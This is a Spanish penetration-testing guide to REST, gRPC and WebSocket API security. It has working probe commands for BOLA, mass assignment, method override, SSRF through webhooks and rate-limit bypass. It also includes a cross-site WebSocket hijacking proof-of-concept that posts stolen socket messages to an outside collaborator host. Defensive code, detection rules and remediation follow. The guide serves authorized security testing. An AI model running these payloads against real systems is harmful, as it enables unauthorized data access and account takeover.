# Seguridad de API REST, gRPC y WebSocket (API Security)

| Clasificación | |
|---|---|
| CWE | CWE-639 — Authorization Bypass Through User-Controlled Key; CWE-285 — Improper Authorization; CWE-915 — Improperly Controlled Modification of Dynamically-Determined Object Attributes (asignación masiva); CWE-213 — Exposure of Sensitive Information Due to Incompatible Policies; CWE-770 — Allocation of Resources Without Limits or Throttling; CWE-1385 — Missing Origin Validation in WebSockets |
| OWASP Top 10:2025 | A01 — Broken Access Control; A02 — Security Misconfiguration; A06 — Insecure Design; A05 — Injection (inyección a través de parámetros de API y mensajes) |
| OWASP API Top 10:2023 | API1 a API10 (recorrido completo en la sección 4.1) |
| WSTG | Capítulo 4.12 *API Testing*; WSTG-ATHZ-02/04 (elusión de autorización, IDOR); WSTG-CONF-06 (métodos HTTP); WSTG-INPV-04 (contaminación de parámetros); WSTG-CLNT-10 (WebSockets) |

**Contenido:** 1. Qué es · 2. Dónde buscar (descubrimiento de especificaciones) · 3. Detección segura · 4. Explotación: 4.1 OWASP API Top 10 · 4.2 Versiones e inventario · 4.3 Asignación masiva · 4.4 Exposición excesiva de datos · 4.5 Manipulación de verbos y *method override* · 4.6 Cambio de tipo de contenido · 4.7 Paginación, orden y filtros · 4.8 Límites y consumo de recursos · 4.9 Webhooks · 4.10 gRPC · 4.11 WebSockets · 5. Evasión · 6. Escalada · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

Una API (*Application Programming Interface*, interfaz que otras aplicaciones usan para hablar con el servidor) expone directamente objetos y funciones de negocio. En las aplicaciones modernas (SPA, móviles, microservicios) casi toda la lógica de seguridad vive en la API, y la interfaz gráfica solo muestra una parte de lo que la API acepta.

- **REST** usa URLs como recursos (`/api/v1/orders/123`) y verbos HTTP (`GET`, `POST`, `PUT`, `PATCH`, `DELETE`), normalmente con JSON.
- **gRPC** es un marco de llamadas a procedimientos remotos sobre HTTP/2 que serializa mensajes en *Protocol Buffers* (protobuf, un formato binario definido en ficheros `.proto`). *gRPC-Web* es su variante para navegadores.
- **WebSocket** es un canal bidireccional y persistente que se abre con una petición HTTP de actualización (`Upgrade: websocket`) y luego intercambia mensajes sin la estructura petición-respuesta.

Por qué fallan: autorización comprobada solo en la interfaz o solo en algunos verbos; enlace automático de JSON a modelos de base de datos; serializadores que devuelven el objeto entero; versiones antiguas olvidadas; falta de límites de tamaño y frecuencia; y en gRPC y WebSocket, la falsa creencia de que «no es HTTP» y por tanto no necesita los mismos controles.

## 2. Dónde buscar (señales del reconocimiento)

**Especificaciones y documentación expuestas.** Una especificación OpenAPI/Swagger enumera rutas, parámetros y esquemas, incluidos los que la interfaz no usa.

```bash
for p in /swagger.json /swagger.yaml /openapi.json /openapi.yaml /api-docs /v2/api-docs /v3/api-docs \
         /swagger/v1/swagger.json /swagger-ui.html /swagger-ui/index.html /api/swagger.json /docs /redoc \
         /api/openapi.json /application.wadl "/api?_wadl" "/service?wsdl" /.well-known/openid-configuration \
         /actuator /actuator/mappings /graphql /api/graphql; do
  c=$(curl -sk -o /dev/null -w "%{http_code}" "https://target.example$p"); [ "$c" != 404 ] && echo "$c $p"
done
```

- **WADL** (*Web Application Description Language*): descripción XML de servicios REST en Java (Jersey: `/application.wadl`; Apache CXF: `?_wadl`). **WSDL** es el equivalente SOAP.
- **Colecciones Postman** públicas: buscar el nombre del cliente en los espacios de trabajo públicos de Postman y en SwaggerHub; a menudo incluyen variables con tokens o entornos de preproducción.
- **JS y apps móviles:** rutas en el *bundle* (`grep -oE '"/api/[^"]+"'`), ficheros `*_pb.js` o `*.proto` (gRPC-Web), *source maps* (`main.js.map`), APK/IPA descompiladas.
- **Tráfico real:** generar una especificación a partir de lo capturado (mitmproxy2swagger) y comparar con la publicada.
- **Hosts:** `api.`, `api-dev.`, `api-staging.`, `internal-api.`, `mobile-api.`; puertos gRPC habituales (`50051`, `443` con `content-type: application/grpc`).
- **Cabeceras:** `X-Powered-By`, `grpc-status`, `Sec-WebSocket-Accept`, `Api-Version`, `X-RateLimit-*`.

## 3. Detección segura (primeras sondas, no destructivas)

1. **Matriz de identidades:** prepara al menos dos usuarios del mismo rol (A y B), un usuario de otro inquilino y, si existe, un administrador de prueba. Cada prueba de autorización es «petición de A con el identificador de B».
2. **Lecturas antes que escrituras:** valida BOLA y BFLA primero con `GET`. Para escrituras, usa objetos creados por tus propias cuentas de prueba.
3. **Campos de eco:** añade un campo inventado (`"zzz_test": 1`) a un `PATCH` sobre tu propio perfil; si vuelve en la respuesta o persiste, el enlace de campos es permisivo.
4. **Comparar respuestas API frente a interfaz:** todo lo que la API devuelve y la pantalla no muestra es candidato a exposición excesiva.
5. **Un solo cambio por prueba:** verbo, tipo de contenido, versión o parámetro; así sabes qué ha provocado el comportamiento.

## 4. Explotación por contexto o tecnología

### 4.1 Recorrido por el OWASP API Security Top 10:2023

| Riesgo | Qué probar | Ejemplo / referencia |
|---|---|---|
| **API1 BOLA** (autorización a nivel de objeto) | Sustituir IDs de objeto (numéricos, UUID, *slugs*, IDs codificados) con el token de otro usuario, en todos los verbos y en rutas anidadas | `GET /api/v1/users/1002/orders` con token de 1001 → `vulns/access-control-idor.md` |
| **API2 Autenticación rota** | Tokens caducados o emitidos antes de un cambio de contraseña, `Authorization` vacío o `null`, API keys en la URL, login sin límite, JWT débiles | `vulns/authentication.md`, `vulns/jwt.md` |
| **API3 Autorización a nivel de propiedad** | Asignación masiva (escribir campos prohibidos) y exposición excesiva (leer campos prohibidos) | Secciones 4.3 y 4.4 |
| **API4 Consumo de recursos sin límite** | Tamaño de página, cuerpo, archivos, operaciones caras, coste por SMS/correo | Sección 4.8 |
| **API5 BFLA** (autorización a nivel de función) | Endpoints administrativos con token de usuario normal; cambiar `GET` por `DELETE`; prefijos `/admin`, `/internal`, `/manage` | `vulns/access-control-idor.md` |
| **API6 Acceso sin límite a flujos de negocio sensibles** | Automatizar compras, reservas, referidos, creación de cuentas | `vulns/business-logic.md` |
| **API7 SSRF** | Parámetros con URL: webhooks, importaciones, avatares, previsualizaciones | Sección 4.9 y `vulns/ssrf.md` |
| **API8 Mala configuración** | CORS, cabeceras, mensajes de error detallados, métodos innecesarios, TLS, Actuator | `vulns/cors.md`, `vulns/config-exposure.md` |
| **API9 Gestión de inventario deficiente** | Versiones antiguas, hosts de preproducción, endpoints no documentados | Sección 4.2 |
| **API10 Consumo inseguro de APIs** | La aplicación confía en respuestas de terceros (redirecciones, datos sin validar) | Revisar integraciones: ¿sigue redirecciones? ¿valida el esquema de la respuesta? |

```bash
# BOLA en todos los verbos sobre un objeto de la cuenta B (objeto de prueba)
for m in GET PUT PATCH DELETE; do
  curl -s -o /dev/null -w "$m %{http_code}\n" -X $m -H "Authorization: Bearer $TOKEN_A" \
    -H "Content-Type: application/json" -d '{"note":"poc-corvus"}' \
    https://target.example/api/v1/orders/$ORDER_ID_DE_B
done
```

⚠️ `PUT`, `PATCH` y `DELETE` sobre objetos de otros usuarios modifican datos ajenos: **requiere confirmación explícita del cliente**; hacerlo solo contra objetos de cuentas de prueba.

### 4.2 Versiones e inventario (API9)

```bash
for v in v0 v1 v2 v3 v1.0 v1.1 beta internal private legacy mobile dev; do
  c=$(curl -s -o /dev/null -w "%{http_code}" -H "Authorization: Bearer $TOKEN" "https://target.example/api/$v/users/me")
  [ "$c" != 404 ] && echo "$v -> $c"
done
# Versión por cabecera o parámetro
curl -s -H "Accept: application/vnd.target.v1+json" https://target.example/api/users/me
curl -s -H "Api-Version: 2019-01-01" https://target.example/api/users/me
curl -s "https://target.example/api/users/me?api-version=1.0"
```

Lo habitual: `v2` corrige BOLA o limita la velocidad y `v1` sigue activa sin el arreglo; la API móvil antigua devuelve más campos; el host de preproducción usa datos reales con controles relajados.

### 4.3 Asignación masiva (*mass assignment*)

Ocurre cuando el *framework* copia automáticamente todas las claves del JSON a las propiedades del modelo. Prueba sobre tu propio objeto:

```http
PATCH /api/v1/users/me HTTP/1.1
Content-Type: application/json
Authorization: Bearer <token_A>

{"displayName":"poc","role":"admin","isAdmin":true,"is_staff":true,"permissions":["*"],
 "emailVerified":true,"plan":"enterprise","credits":99999,"tenantId":"OTRO","ownerId":1,
 "user":{"role":"admin"},"__proto__":{"isAdmin":true}}
```

Descubre nombres de campo reales en: respuestas `GET` del mismo objeto, esquemas de la especificación (`components.schemas`), mensajes de error de validación, JS del panel de administración y documentación pública. Prueba también variantes anidadas (`profile[role]=admin` en formularios), `snake_case` frente a `camelCase`, y la creación (`POST`) además de la edición. La clave `__proto__` enlaza con `vulns/prototype-pollution.md`.

### 4.4 Exposición excesiva de datos

```bash
curl -s -H "Authorization: Bearer $TOKEN_A" https://target.example/api/v1/users/me | jq 'paths(scalars) | join(".")'
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.example/api/v1/posts/42?include=author,author.apiKeys"
curl -s -H "Authorization: Bearer $TOKEN_A" "https://target.example/api/v1/users?fields=email,passwordHash,resetToken"
```

Busca en respuestas: hashes de contraseña, tokens de restablecimiento, API keys, correos y teléfonos de otros usuarios en listados públicos (comentarios, reseñas), flags internos, IP, direcciones. Revisa también los mensajes de error y las respuestas a `OPTIONS`.

### 4.5 Manipulación de verbos y *method override*

```bash
# ¿El control se aplica solo a algunos verbos?
for m in GET HEAD POST PUT PATCH DELETE OPTIONS TRACE FOO; do
  curl -s -o /dev/null -w "$m %{http_code}\n" -X $m -H "Authorization: Bearer $TOKEN_USER" \
    https://target.example/api/v1/admin/settings
done
# Override: el proxy/WAF ve POST, la aplicación ejecuta DELETE/PUT
curl -s -X POST -H "X-HTTP-Method-Override: DELETE" -H "Authorization: Bearer $TOKEN_A" https://target.example/api/v1/users/$ID_PRUEBA_B
curl -s -X POST -H "X-HTTP-Method: PUT" -H "X-Method-Override: PUT" ...
curl -s -X POST -d "_method=DELETE" https://target.example/users/$ID_PRUEBA_B      # Rails, Laravel, Symfony
curl -s -X POST "https://target.example/users/$ID_PRUEBA_B?_method=DELETE"
```

`HEAD` suele ejecutarse con el manejador de `GET`; si la regla de autorización solo cubre `GET`, `HEAD` puede pasar y aun así provocar efectos. Métodos desconocidos (`FOO`) se tratan a veces como `GET`.

### 4.6 Cambio de tipo de contenido (JSON ↔ XML ↔ formulario)

```bash
# Mismo endpoint, distinto formato
curl -s -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "name=poc&role=admin" https://target.example/api/v1/users/me
curl -s -X POST -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?><user><name>poc</name><role>admin</role></user>' https://target.example/api/v1/users/me
curl -s -X POST -H "Content-Type: text/plain" -d '{"name":"poc"}' https://target.example/api/v1/users/me
curl -s -X POST -H "Content-Type: application/x-yaml" -d 'name: poc' https://target.example/api/v1/users/me
```

Consecuencias: si acepta XML → probar XXE (`vulns/xxe.md`); si acepta formulario o `text/plain` sin preflight CORS → posible CSRF sobre la API (`vulns/csrf.md`); si acepta YAML u objetos serializados → `vulns/deserialization.md`; validaciones o WAF que solo analizan JSON (`vulns/waf-bypass.md`). Prueba también claves duplicadas (`{"role":"user","role":"admin"}`): distintos *parsers* se quedan con la primera o la última (`vulns/parameter-pollution.md`).

### 4.7 Paginación, orden y filtros

```bash
curl -s "https://target.example/api/v1/users?limit=100000"           # ⚠️ volumen: ver 4.8
curl -s "https://target.example/api/v1/users?page=-1&per_page=0"
echo 'eyJpZCI6MTAwMX0=' | base64 -d                                    # cursor = {"id":1001}
curl -s "https://target.example/api/v1/users?cursor=$(echo -n '{"id":1,"tenant":"OTRO"}' | base64 -w0)"
curl -s "https://target.example/api/v1/users?sort=password_hash"       # oráculo por ordenación
curl -s "https://target.example/api/v1/users?filter[role]=admin&filter[tenant_id]=OTRO"
curl -s "https://target.example/api/v1/users?select=*"                 # PostgREST
curl -s "https://target.example/odata/Users?\$select=*&\$expand=*"     # OData
```

- **Oráculo de ordenación:** si se puede ordenar por un campo oculto (hash, token), el orden de los resultados filtra información carácter a carácter.
- **Fugas a través del ORM** (investigación *ORM Leak*, elttam 2024): filtros que recorren relaciones permiten preguntar por campos sensibles, por ejemplo en Django `?created_by__password__startswith=pbkdf2_sha256$`, en Prisma `{"where":{"createdBy":{"password":{"startsWith":"$2b"}}}}`, o en *frameworks* tipo Strapi/Directus con operadores `$startsWith`. Ver también `vulns/nosqli.md`.
- **Cursores** firmados o cifrados frente a cursores en base64 manipulables.

### 4.8 Límites de frecuencia y consumo de recursos (API4)

Comprueba límites con el menor volumen que los evidencie:

```bash
for i in $(seq 1 30); do curl -s -o /dev/null -w "%{http_code} " -H "Authorization: Bearer $TOKEN" \
  "https://target.example/api/v1/search?q=test"; done; echo
curl -sI -H "Authorization: Bearer $TOKEN" https://target.example/api/v1/search?q=a | grep -iE "ratelimit|retry-after"
```

Vectores: tamaño de página, cuerpos grandes, ficheros, expresiones regulares en búsquedas (ReDoS), exportaciones, generación de informes, envíos de SMS/correo (coste económico), lotes (`/batch`, arrays de operaciones). Elusión de limitadores: rotar `X-Forwarded-For`, cambiar mayúsculas o barra final en la ruta, usar otra versión, repartir entre API keys.

⚠️ Pruebas de carga, cuerpos de varios MB, ReDoS o envíos masivos pueden degradar el servicio o generar coste: **requiere confirmación explícita del cliente**. Demostrar con una medición de tiempo creciente (10, 20, 30 caracteres) y no con una caída.

### 4.9 Webhooks

**Salientes** (la API llama a una URL que tú configuras):

```bash
curl -s -X POST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" \
  -d '{"url":"https://<tu-colaborador>.oastify.com/hook","events":["order.created"]}' https://target.example/api/v1/webhooks
```

Prueba: SSRF hacia `127.0.0.1`, `169.254.169.254`, nombres internos, redirecciones 30x desde tu servidor hacia destinos internos, *DNS rebinding* (ver `vulns/ssrf.md`); si existe un «registro de entregas» que muestra el cuerpo de la respuesta, el SSRF es de lectura. Comprueba también si el webhook envía datos de otros inquilinos o secretos en cabeceras.

**Entrantes** (la aplicación recibe eventos de terceros): ¿verifica firma HMAC, marca de tiempo y deduplicación? Un webhook de pago sin firma permite marcar pedidos como pagados (`vulns/business-logic.md`).

### 4.10 gRPC

```bash
# Enumeración con reflexión (servicio grpc.reflection.v1 / v1alpha)
grpcurl -plaintext target.example:50051 list
grpcurl target.example:443 list                               # TLS por defecto
grpcurl -insecure target.example:443 describe app.UserService
grpcurl -plaintext target.example:50051 describe app.GetUserRequest
# Sin reflexión: usar los .proto obtenidos del cliente
grpcurl -import-path ./protos -proto user.proto -plaintext target.example:50051 list
# BOLA y BFLA
grpcurl -plaintext -H "authorization: Bearer $TOKEN_A" -d '{"user_id":"1002"}' target.example:50051 app.UserService/GetUser
grpcurl -plaintext -H "authorization: Bearer $TOKEN_USER" -d '{}' target.example:50051 app.AdminService/ListUsers
# Inyección de metadatos (equivalente a cabeceras HTTP)
grpcurl -plaintext -H "authorization: Bearer $TOKEN" -H "x-user-role: admin" -H "x-internal: true" \
  -H "x-forwarded-for: 127.0.0.1" -d '{}' target.example:50051 app.AdminService/GetConfig
# Servicios auxiliares que filtran información
grpcurl -plaintext target.example:50051 grpc.health.v1.Health/Check
grpcurl -plaintext target.example:50051 list grpc.channelz.v1.Channelz
# Interfaz web para explorar
grpcui -plaintext target.example:50051
```

- **Reflexión habilitada en producción** es un hallazgo de configuración por sí misma (mapa completo de la API).
- **gRPC-Web** (`Content-Type: application/grpc-web+proto` o `application/grpc-web-text`, en base64): cada mensaje lleva un prefijo de 5 bytes (1 byte de *flags* + 4 de longitud). Decodificar con `protoc --decode_raw` o la extensión Blackbox Protobuf de Burp; extraer los `.proto` de los `*_pb.js` del cliente o de binarios móviles con pbtk.
- **Tipos y valores:** enteros negativos o enormes en `int64`, campos desconocidos (protobuf los ignora o los conserva), `oneof` con ambos campos, mensajes enormes (`grpc.max_receive_message_length`).
- **Inyección:** los campos `string` llegan a SQL, comandos o plantillas igual que en REST (`vulns/sqli.md`, `vulns/cmdi-rce.md`).
- **Streams:** autorización comprobada solo al abrir el *stream* y no en cada mensaje.

### 4.11 WebSockets

```bash
# Apertura con distintos Origin
websocat -H "Origin: https://evil.example" "wss://target.example/ws"
websocat -H "Origin: https://target.example.evil.example" "wss://target.example/ws"
websocat "wss://target.example/ws"                                    # sin Origin
wscat -c "wss://target.example/ws" -H "Cookie: session=SESION_PRUEBA"
# Socket.IO
curl -s "https://target.example/socket.io/?EIO=4&transport=polling"
```

**CSWSH** (*Cross-Site WebSocket Hijacking*, secuestro del WebSocket desde otro sitio): si el *handshake* se autentica solo con cookies, no valida `Origin` y no lleva token impredecible, una página del atacante abre el socket con la sesión de la víctima y lee o envía mensajes. Las cookies `SameSite=Lax` o `Strict` no se envían en *handshakes* de sitios distintos, pero sí desde subdominios del mismo sitio (un XSS o un subdominio comprometido reabre el ataque).

```html
<!-- PoC alojada en un dominio controlado por el auditor; solo con cuentas de prueba -->
<script>
const ws = new WebSocket("wss://target.example/ws");
ws.onopen = () => ws.send(JSON.stringify({type:"get_history"}));
ws.onmessage = e => fetch("https://<tu-colaborador>.oastify.com/c", {method:"POST", body:e.data});
</script>
```

**Autorización por mensaje:** el canal se autentica una vez, pero cada mensaje debe autorizarse.

```json
{"type":"subscribe","channel":"user.1002.notifications"}
{"type":"message","room":"admin-only","content":"poc"}
{"type":"transfer","from":"ACCT-DE-B","amount":1}
{"type":"set_role","user":"me","role":"admin"}
```

Prueba también: token caducado o revocado en una conexión ya abierta (¿se cierra?), cambio de usuario en la conexión, inyección en el contenido de los mensajes (XSS almacenado en chats → `vulns/xss.md`; SQLi en filtros → `vulns/sqli.md`), mensajes gigantes o ráfagas (⚠️ **requiere confirmación explícita del cliente**), y manipulación del *handshake* (cabeceras `X-Forwarded-For` para evitar bloqueos por IP). En Burp: *Proxy → WebSockets history*, reenviar mensajes a Repeater y editar el *handshake*.

## 5. Evasión de filtros y WAF

- **Cambio de tipo de contenido** (4.6): muchos WAF inspeccionan bien JSON o formulario pero no ambos, ni XML, ni multipart.
- **Escapes JSON:** `{"q":"' OR 1=1-- -"}` llega al *backend* como comilla, pero el WAF puede ver `'`.
- **Versiones y rutas alternativas:** `/api/v1/` frente a `/api/v2/`, `/API/`, `/api//users`, `/api/users/`, `/api/users;x`, `/api/users%2f..`.
- **Method override** (4.5) para rutas cuyo verbo está bloqueado en el borde.
- **gRPC y WebSocket:** los mensajes binarios o dentro de un socket ya abierto rara vez pasan por las mismas reglas que las peticiones HTTP.
- Ver `vulns/waf-bypass.md` para técnicas genéricas.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

- BOLA de lectura en un endpoint de listado + IDs secuenciales → fuga masiva: demostrar con 2–3 registros de cuentas de prueba y estimar el total con el contador de la paginación, sin descargar la base de datos.
- Asignación masiva de `role` o `tenantId` → BFLA → administración de la plataforma: demostrar con una cuenta de prueba y revertir el cambio.
- Exposición de `resetToken` en un listado → toma de cuenta.
- Webhook con SSRF de lectura → credenciales del servicio de metadatos en la nube (`vulns/ssrf.md`): parar en la lectura del rol, no usar las credenciales sin permiso.
- CSWSH + historial de chat o acción de transferencia → robo de datos o acción en nombre de la víctima (la víctima es siempre una cuenta de prueba).
- Reflexión gRPC + método administrativo sin interceptor de autenticación → control total del servicio.

## 7. Caja blanca: fuentes, sumideros y patrones de código

### Asignación masiva y exposición excesiva

```js
// VULNERABLE (Express + Mongoose)
app.patch('/api/users/me', auth, async (req, res) => {
  Object.assign(req.user, req.body); await req.user.save(); res.json(req.user);   // escribe y devuelve todo
});
// SEGURO: lista blanca de entrada y de salida
const { pick } = require('lodash');
app.patch('/api/users/me', auth, async (req, res) => {
  Object.assign(req.user, pick(req.body, ['displayName', 'bio']));
  await req.user.save();
  res.json(pick(req.user, ['id', 'displayName', 'bio']));
});
```

```python
# VULNERABLE (Django REST Framework)
class UserSerializer(serializers.ModelSerializer):
    class Meta: model = User; fields = "__all__"
# SEGURO
class UserSerializer(serializers.ModelSerializer):
    class Meta:
        model = User
        fields = ["id", "display_name", "bio"]
        read_only_fields = ["id"]
```

```ruby
# VULNERABLE (Rails)
@user.update(params.require(:user).permit!)
# SEGURO
@user.update(params.require(:user).permit(:display_name, :bio))
```

```java
// VULNERABLE (Spring): entidad JPA como cuerpo de la petición y de la respuesta
@PutMapping("/users/me") public User update(@RequestBody User u) { return repo.save(u); }
// SEGURO: DTO de entrada y DTO de salida
public record UpdateProfile(@Size(max=50) String displayName, @Size(max=500) String bio) {}
```

### BOLA en consultas

```js
// VULNERABLE
const order = await Order.findById(req.params.id);
// SEGURO: el filtro incluye al propietario o al inquilino
const order = await Order.findOne({ _id: req.params.id, tenantId: req.user.tenantId, ownerId: req.user.id });
if (!order) return res.sendStatus(404);
```

### WebSocket, gRPC y *method override*

```js
// VULNERABLE: ws sin comprobar Origin
new WebSocketServer({ server });
// SEGURO
new WebSocketServer({ server, verifyClient: ({ origin, req }) =>
  ALLOWED_ORIGINS.has(origin) && validSession(req) });
// Socket.IO: cors: { origin: "*", credentials: true } es la versión vulnerable
```

```go
// gRPC (Go): reflexión registrada sin condición y sin interceptor de autenticación
s := grpc.NewServer()
reflection.Register(s)                       // solo en desarrollo
// SEGURO
s := grpc.NewServer(grpc.ChainUnaryInterceptor(authUnary), grpc.ChainStreamInterceptor(authStream))
if os.Getenv("ENV") == "dev" { reflection.Register(s) }
```

### Consultas para localizarlo

```bash
rg -n "(Object\.assign\([^,]+,\s*req\.body|\.update\(req\.body|new \w+\(req\.body\)|permit!|fields\s*=\s*['\"]__all__['\"]|\$request->all\(\)|\$guarded\s*=\s*\[\s*\])"
rg -n "@RequestBody\s+(?!.*(Dto|DTO|Request|Command))\w+" --pcre2 --type java
rg -n "(findById|findByPk|get_object_or_404|objects\.get)\((req\.params|request\.|params\[|id\))" 
rg -n "(methodOverride\(|X-HTTP-Method-Override|_method|HiddenHttpMethodFilter|http_method_override)"
rg -n "(reflection\.Register|enable_server_reflection|AddGrpcReflection|ProtoReflectionService)"
rg -n "(new WebSocketServer|WebSocketServer\(|setAllowedOrigins\(\"\*\"\)|setAllowedOriginPatterns\(\"\*\"\)|origin:\s*['\"]\*['\"])"
rg -n -i "(max_page_size|maxLimit|limit\s*=\s*(req|request)\.)"
```

```yaml
# semgrep: Express escribe el cuerpo completo en un modelo
rules:
  - id: express-mass-assignment
    languages: [javascript, typescript]
    severity: WARNING
    message: Asignación masiva desde req.body; usar lista blanca de campos
    pattern-either:
      - pattern: Object.assign($MODEL, req.body)
      - pattern: $MODEL.update(req.body, ...)
      - pattern: $MODEL.create(req.body, ...)
      - pattern: new $M(req.body)
```

## 8. Falsos positivos frecuentes

- `200 OK` con cuerpo vacío o con tus propios datos al cambiar el ID: la API ignora el parámetro de la ruta y usa el usuario del token (no hay BOLA).
- Campos de asignación masiva que aparecen en la respuesta (eco) pero no se guardan: confirma con un `GET` posterior y, para `role`, intentando una acción privilegiada.
- IDs de otros usuarios que en realidad son públicos por diseño (perfiles públicos): revisa la política de privacidad del producto.
- `X-HTTP-Method-Override` que devuelve 200 pero ejecuta el `POST` original.
- WebSocket que acepta cualquier `Origin` pero se autentica con un token en el primer mensaje (no con cookies): no hay CSWSH.
- Reflexión gRPC activa en un entorno de desarrollo dentro del alcance: es informativo si el cliente lo acepta como tal.
- Límites de frecuencia aplicados en el CDN con una ventana mayor que tu prueba: amplía la observación antes de afirmar que no existen.

## 9. Evidencia mínima para validarlo

- Petición y respuesta completas con identificación del token usado (usuario A) y del propietario del objeto (usuario B), ambos de prueba.
- Para escrituras: estado antes, petición, estado después (con `GET` independiente) y reversión.
- Para asignación masiva: campo enviado, prueba de persistencia y efecto (acción que antes daba 403 y ahora 200).
- Para exposición excesiva: ruta JSON del campo sensible y por qué no debería verse.
- Para gRPC: comando `grpcurl` exacto y salida; para WebSocket: *handshake* y mensajes (Burp WebSockets history) o la PoC HTML con la captura del colaborador.
- Para límites: número de peticiones, intervalo, códigos y ausencia de `429` o bloqueo, sin superar lo autorizado.

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Impacto demostrado | CVSS 3.1 | CVSS 4.0 (vector; calcular la puntuación en FIRST) |
|---|---|---|
| Reflexión gRPC o especificación expuesta sin datos sensibles | `AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N` → 5.3 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N` |
| BOLA de lectura de datos personales | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` → 6.5 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| BOLA de lectura y escritura entre inquilinos | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N` → 8.1 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Asignación masiva a administrador / BFLA total | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:H` → 8.8 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| CSWSH con lectura y acciones en nombre de la víctima | `AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N` → 8.1 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N` |
| Método gRPC administrativo sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` → 9.8 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| Ausencia de límites que degrada el servicio (demostrada por tiempos) | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:N/A:L` → 4.3 | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:N/VA:L/SC:N/SI:N/SA:N` |

## 11. Remediación (con ejemplo de código correcto)

- **Autorización centralizada** a nivel de objeto, propiedad y función en cada endpoint, verbo y método gRPC (*middleware* o interceptores, con denegación por defecto).
- **DTOs de entrada y salida** con listas blancas; nunca enlazar entidades de base de datos directamente.
- **Inventario de API:** especificación como contrato (validación de esquema en el *gateway*), retirada real de versiones antiguas, preproducción sin datos reales.
- **Validación estricta del tipo de contenido** aceptado por endpoint; rechazar formatos no previstos con `415`.
- **Desactivar *method override*** o limitarlo a formularios HTML con protección CSRF.
- **Límites:** tamaño máximo de página y de cuerpo, cuotas por identidad, tiempo máximo de operación, límites de mensajes en gRPC y WebSocket.
- **Webhooks salientes:** lista de destinos permitidos o resolución DNS con bloqueo de rangos internos, sin seguir redirecciones; **entrantes:** firma HMAC con marca de tiempo y deduplicación.
- **gRPC:** reflexión solo en desarrollo, TLS/mTLS, interceptores de autenticación y autorización para unario y *stream*.
- **WebSocket:** validar `Origin` contra lista blanca, token en el *handshake* o primer mensaje, autorización por mensaje y por canal, cierre al caducar o revocar el token.

```python
# FastAPI: DTOs, lista blanca, BOLA y paginación acotada
class ProfileIn(BaseModel):
    model_config = ConfigDict(extra="forbid")          # 422 ante campos desconocidos
    display_name: constr(max_length=50) | None = None
    bio: constr(max_length=500) | None = None

class ProfileOut(BaseModel):
    id: int
    display_name: str | None
    bio: str | None

@app.patch("/api/v1/users/me", response_model=ProfileOut)
def update_me(data: ProfileIn, user=Depends(current_user), db=Depends(get_db)):
    for k, v in data.model_dump(exclude_unset=True).items():
        setattr(user, k, v)
    db.commit()
    return user

@app.get("/api/v1/orders/{order_id}", response_model=OrderOut)
def get_order(order_id: int, limit: conint(ge=1, le=100) = 20, user=Depends(current_user), db=Depends(get_db)):
    order = db.query(Order).filter_by(id=order_id, tenant_id=user.tenant_id, owner_id=user.id).first()
    if not order:
        raise HTTPException(404)
    return order
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Comando / uso |
|---|---|
| Burp Suite + Autorize / AuthMatrix | Repetir cada petición con tokens de otros roles tras mapear la API a mano |
| Postman / Bruno | Importar OpenAPI o colecciones, organizar pruebas por identidad |
| kiterunner | Descubrir rutas de API con listas basadas en especificaciones: `kr scan https://target.example -w routes-large.kite` |
| ffuf | Rutas y versiones: `ffuf -u https://target.example/api/FUZZ -w api-wordlist.txt -mc all -fc 404` |
| Arjun | Parámetros ocultos: `arjun -u https://target.example/api/v1/users -m GET --headers "Authorization: Bearer $T"` |
| mitmproxy2swagger | Generar OpenAPI desde tráfico capturado y compararlo con el publicado |
| grpcurl / grpcui | Enumerar y llamar servicios gRPC (sección 4.10) |
| Blackbox Protobuf (Burp), `protoc --decode_raw`, pbtk | Decodificar protobuf sin `.proto` y extraer definiciones de clientes |
| websocat / wscat / Burp WebSockets | Pruebas de *handshake*, Origin y mensajes |
| jwt_tool | Tokens de API en formato JWT (`vulns/jwt.md`) |
| Burp Scanner con definición OpenAPI importada | Barrido automático solo después de las pruebas manuales de autorización |

## 13. Referencias

- OWASP API Security Top 10 2023: https://owasp.org/API-Security/editions/2023/en/0x11-t10/
- OWASP WSTG — API Testing y WebSockets (WSTG-CLNT-10): https://owasp.org/www-project-web-security-testing-guide/
- OWASP Cheat Sheets — REST Security, Mass Assignment, WebSocket Security: https://cheatsheetseries.owasp.org/
- PortSwigger — API testing: https://portswigger.net/web-security/api-testing · WebSockets: https://portswigger.net/web-security/websockets
- HackTricks — Web API Pentesting y WebSocket attacks: https://book.hacktricks.wiki/
- PayloadsAllTheThings — API Key Leaks, Mass Assignment, Web Sockets: https://github.com/swisskyrepo/PayloadsAllTheThings
